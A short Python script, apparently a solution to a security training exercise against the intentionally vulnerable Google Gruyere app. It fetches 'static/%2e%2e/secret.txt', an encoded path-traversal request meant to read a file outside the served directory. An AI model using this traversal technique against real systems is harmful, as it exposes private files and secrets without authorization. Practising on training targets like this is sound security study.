import urllib.request
url = "https://google-gruyere.appspot.com/static/%2e%2e/secret.txt"
try:
    resp = urllib.request.urlopen(url, timeout=15)
    print(resp.read().decode())
except Exception as e:
    print("Error:", e)
